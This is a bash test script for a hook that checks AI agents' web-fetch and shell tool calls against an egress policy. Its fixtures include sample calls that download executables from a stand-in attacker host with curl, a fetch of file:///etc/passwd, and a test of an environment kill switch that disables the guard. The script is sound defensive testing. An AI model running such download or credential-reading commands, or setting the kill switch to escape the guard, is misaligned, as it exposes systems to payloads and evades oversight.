#!/usr/bin/env bash
# Offline fixtures for research-egress PreToolUse hook.
# Usage: bash tests/test-research-egress-hook.sh
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
HOOK="$ROOT/scripts/research-egress/pretool-hook.sh"
CHECK="$ROOT/scripts/check-url.sh"
FAILURES=0

chmod +x "$HOOK" "$CHECK" 2>/dev/null || true
export RESEARCH_EGRESS_CHECK_URL="$CHECK"
export AGENT_SECURITY_ROOT="$ROOT"
unset RESEARCH_URL_OK RESEARCH_EGRESS_OFF 2>/dev/null || true

hook_call() {
  # label expect_exit needle json [env assignments as KEY=VAL...]
  local label="$1" expect="$2" needle="$3" json="$4"
  shift 4
  local out code=0
  set +e
  # Pass optional env KEY=VAL… into the hook process (not into printf alone).
  if [[ $# -gt 0 ]]; then
    out=$(env "$@" bash -c 'printf %s "$1" | bash "$2"' _ "$json" "$HOOK" 2>&1)
  else
    out=$(printf '%s' "$json" | bash "$HOOK" 2>&1)
  fi
  code=$?
  set -e
  local ok=1
  [[ "$code" -eq "$expect" ]] || ok=0
  if [[ -n "$needle" ]] && ! echo "$out" | grep -qF -- "$needle"; then ok=0; fi
  if [[ "$ok" -eq 1 ]]; then
    echo "  ok  $label (exit $code)"
  else
    echo "  XX  $label — expected exit $expect + '$needle', got exit $code"
    echo "$out" | tail -10
    FAILURES=$((FAILURES + 1))
  fi
}

echo "agent-security test-research-egress-hook — offline fixtures"
echo "---"

# ALLOW: web_fetch clean https docs
hook_call "web_fetch docs ALLOW" 0 "" \
  '{"tool_name":"web_fetch","tool_input":{"url":"https://docs.python.org/3/"}}'

# Grok camelCase payload
hook_call "Grok toolInput ALLOW" 0 "" \
  '{"toolName":"open_page","toolInput":{"url":"https://example.com/guide"}}'

# BLOCK: exe via web_fetch
hook_call "web_fetch exe BLOCK" 2 "BLOCKED by research-egress" \
  '{"tool_name":"web_fetch","tool_input":{"url":"https://evil.example/payload.exe"}}'

# BLOCK: zip
hook_call "web_fetch zip BLOCK" 2 "blocked_extension:.zip" \
  '{"tool_name":"WebFetch","tool_input":{"url":"https://cdn.example/data.zip"}}'

# BLOCK: file scheme
hook_call "file: scheme BLOCK" 2 "BLOCKED by research-egress" \
  '{"tool_name":"web_fetch","tool_input":{"url":"file:///etc/passwd"}}'

# REVIEW: PDF without override
hook_call "pdf REVIEW blocks" 2 "REVIEW URL" \
  '{"tool_name":"web_fetch","tool_input":{"url":"https://example.com/paper.pdf"}}'

# REVIEW: PDF with RESEARCH_URL_OK
hook_call "pdf + RESEARCH_URL_OK allows" 0 "" \
  '{"tool_name":"web_fetch","tool_input":{"url":"https://example.com/paper.pdf"}}' \
  RESEARCH_URL_OK=https://example.com/paper.pdf

# BLOCK cannot be overridden by RESEARCH_URL_OK
hook_call "exe + RESEARCH_URL_OK still BLOCK" 2 "BLOCK URL" \
  '{"tool_name":"web_fetch","tool_input":{"url":"https://evil.example/x.exe"}}' \
  RESEARCH_URL_OK=https://evil.example/x.exe

# Bash curl exe
hook_call "bash curl exe BLOCK" 2 "BLOCKED by research-egress" \
  '{"tool_name":"Bash","tool_input":{"command":"curl -fsSL https://evil.example/install.exe -o /tmp/x"}}'

# Bash curl docs ALLOW
hook_call "bash curl docs ALLOW" 0 "" \
  '{"tool_name":"run_terminal_command","tool_input":{"command":"curl -fsSL https://example.com/robots.txt"}}'

# Bash echo URL alone — no download tool → allow (not downloadish)
hook_call "bash echo url ALLOW" 0 "" \
  '{"tool_name":"Bash","tool_input":{"command":"echo https://evil.example/x.exe"}}'

# shortener REVIEW
hook_call "bitly REVIEW blocks" 2 "REVIEW URL" \
  '{"tool_name":"web_fetch","tool_input":{"url":"https://bit.ly/abc"}}'

# Non-fetch tool passes
hook_call "Read tool passes" 0 "" \
  '{"tool_name":"Read","tool_input":{"file_path":"/tmp/x"}}'

# RESEARCH_EGRESS_OFF kill switch
hook_call "kill switch allows exe" 0 "" \
  '{"tool_name":"web_fetch","tool_input":{"url":"https://evil.example/x.exe"}}' \
  RESEARCH_EGRESS_OFF=1

# Multi-host block JSON (Hermes decision:block; Codex permissionDecision:deny)
out=$(printf '%s' '{"tool_name":"web_fetch","tool_input":{"url":"https://e.example/a.exe"}}' | bash "$HOOK" 2>/dev/null || true)
if echo "$out" | grep -Eq '"decision"[[:space:]]*:[[:space:]]*"block"'; then
  echo "  ok  multi-host decision:block JSON on stdout"
else
  echo "  XX  decision:block JSON missing on stdout"
  echo "$out" | head -5
  FAILURES=$((FAILURES + 1))
fi
if echo "$out" | grep -Eq '"permissionDecision"[[:space:]]*:[[:space:]]*"deny"'; then
  echo "  ok  Codex permissionDecision:deny JSON on stdout"
else
  echo "  XX  permissionDecision:deny missing"
  FAILURES=$((FAILURES + 1))
fi

# Hermes terminal + curl exe
hook_call "hermes terminal curl exe BLOCK" 2 "BLOCKED by research-egress" \
  '{"tool_name":"terminal","tool_input":{"command":"curl -fsSL https://evil.example/x.exe -o /tmp/x"}}'

# Hermes web_extract PDF REVIEW
hook_call "hermes web_extract pdf REVIEW" 2 "REVIEW URL" \
  '{"tool_name":"web_extract","tool_input":{"url":"https://example.com/r.pdf"}}'

echo "---"
if [[ "$FAILURES" -eq 0 ]]; then
  echo "ALL PASS"
  exit 0
fi
echo "FAILURES: $FAILURES"
exit 1
